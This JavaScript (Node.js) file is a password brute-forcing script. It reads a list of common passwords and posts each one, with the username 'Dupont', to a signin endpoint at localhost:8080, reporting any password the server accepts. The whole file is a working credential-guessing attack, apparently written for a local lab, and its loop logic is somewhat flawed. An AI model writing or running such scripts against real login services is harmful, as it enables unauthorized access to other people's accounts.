const request = require("request");

const axios = require("axios");
const fs = require("fs");

const signinUrl = "http://localhost:8080/signin";
const commonPasswordsFile = "common_user_password.txt";
let stop = false;

fs.readFile(commonPasswordsFile, "utf8", (err, data) => {
  if (err) throw err;

  let commonPasswords = data.split("\n");
  commonPasswords = commonPasswords.map((possiblePasswords) =>
    possiblePasswords.replace("\r", "")
  );

  const username = "Dupont";

  // console.log(commonPasswords);

  bruteforce(
    commonPasswords,
    (password) => {
      login(username, password);
    },
    () => {
      console.log("Bruteforce process stopped.");
    }
  );
});

const login = (username, password) => {
  return axios
    .post(signinUrl, {
      username: username,
      password: password,
    })
    .then((response) => {
      if (response.status === 200) {
        console.log(`Found correct password: ${password}`);
        stopbf();
        return true;
      }
      return false;
    })
    .catch((error) => {
      // check if error indicate that login failed
    });
};

function stopbf() {
  stop = true;
}
async function bruteforce(passwords, callback, stopCallback) {
  for (let i = 0; i < passwords.length; i++) {
    console.log(passwords[i]);
    if (stop) {
      console.log("stop", stop);
      break;
    } else {
      // console.log("continue", stop);
      let result = await callback(passwords[i]);
    }
  }
  if (stopCallback) stopCallback();
}
